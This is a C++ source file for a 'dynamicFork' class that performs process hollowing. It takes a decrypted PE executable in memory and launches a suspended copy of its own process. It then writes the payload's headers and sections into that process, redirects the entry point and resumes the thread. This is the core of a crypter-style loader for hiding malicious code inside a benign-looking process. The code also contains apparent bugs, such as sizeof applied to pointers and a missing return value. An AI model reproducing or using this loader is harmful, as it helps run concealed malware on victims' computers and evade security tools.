#include "dynamicFork.h"
#include <iostream>


dynamicFork::dynamicFork(char* decryptedData) {
	SetHeaders(decryptedData);
	CreateProcessAndWrite(decryptedData);
}

dynamicFork::~dynamicFork() {

}

int dynamicFork::SetHeaders(char* decryptedData){

	int retValue;
	this->Headers.dosHeader = (IMAGE_DOS_HEADER*)decryptedData;

	if (this->Headers.dosHeader->e_magic == IMAGE_DOS_SIGNATURE) {
		//e_lfanew gives us PE HEADER RELATIVE POSITION
		this->Headers.peHeader = (IMAGE_NT_HEADERS*)((DWORD)decryptedData + this->Headers.dosHeader->e_lfanew);

		if (this->Headers.peHeader->Signature == IMAGE_NT_SIGNATURE)
			retValue = 0;
		else retValue = -1;
	}
	else
		retValue = -1;

	return retValue;
}

int dynamicFork::CreateProcessAndWrite(char* decryptedData) {
	GetModuleFileNameA(0, this->Process.filePath, 512);
	ZeroMemory(this->Process.processInfo, sizeof(this->Process.processInfo)); 
	ZeroMemory(this->Process.startupInfo, sizeof(this->Process.startupInfo));

	if (CreateProcessA(this->Process.filePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, this->Process.startupInfo, this->Process.processInfo) != 0) {
		AllocateContext();
		if (GetThreadContext(this->Process.processInfo->hThread, context) != 0) {

			GetBaseAddrOfNewProcess();
			WriteDataToProcessBaseAddr(decryptedData);
			SetBaseAddressAndEntryPoint();
			SetContextAndResumeThread();
			return 0;
		}
	}
	else
		return -1;
}


void dynamicFork::AllocateContext() {

	context = (CONTEXT*)VirtualAlloc(NULL, sizeof(context), MEM_COMMIT, PAGE_READWRITE);
	context->ContextFlags = CONTEXT_FULL | CONTEXT_INTEGER;
}

void dynamicFork::GetBaseAddrOfNewProcess() {
	imageBase = (DWORD*)VirtualAllocEx(this->Process.processInfo->hProcess, (void*)this->Headers.peHeader->OptionalHeader.ImageBase, 
						this->Headers.peHeader->OptionalHeader.SizeOfImage, 
						MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
}

void dynamicFork::WriteDataToProcessBaseAddr(char* decryptedData) {

	//WRITE HEADERS FROM BASE ADDR TO HEADERSIZE
	WriteProcessMemory(this->Process.processInfo->hProcess, imageBase, decryptedData, this->Headers.peHeader->OptionalHeader.SizeOfHeaders, 0);

	//WRITE SECTIONS
	PIMAGE_SECTION_HEADER secHeader;

	//SECTION HEADER STARTS AT NT HEADER + 4 BYTES OF SIGNATURE + 20 BYTES OF FILEHEADER + 224 BYTES OF PE Optional Header 
	//EACH SECTION HEADER IS 40 BYTES
	for (unsigned int i = 0; i < this->Headers.peHeader->FileHeader.NumberOfSections; i++) {
		secHeader = (IMAGE_SECTION_HEADER*)((DWORD)this->Headers.peHeader + 4 + 224 + 20 + (i * 40));

		WriteProcessMemory(this->Process.processInfo->hProcess, (void*)((DWORD)imageBase + secHeader->VirtualAddress), (void*)((DWORD)decryptedData + secHeader->PointerToRawData), secHeader->SizeOfRawData, 0);
	}
}

void dynamicFork::SetBaseAddressAndEntryPoint() {
	//Write prefered base address to thread context. Apparently the PEB is stored in Ebx register. Ebx + 8 just gets us to the base address. https://www.geoffchappell.com/studies/windows/win32/ntdll/structs/peb/index.htm
	WriteProcessMemory(this->Process.processInfo->hProcess, (void*)(this->context->Ebx + 8), (void*)(&this->Headers.peHeader->OptionalHeader.ImageBase), 4, NULL);

	this->context->Eax = DWORD(imageBase) + this->Headers.peHeader->OptionalHeader.AddressOfEntryPoint;
}

void dynamicFork::SetContextAndResumeThread() {
	SetThreadContext(this->Process.processInfo->hThread, context);
	ResumeThread(this->Process.processInfo->hThread);
}




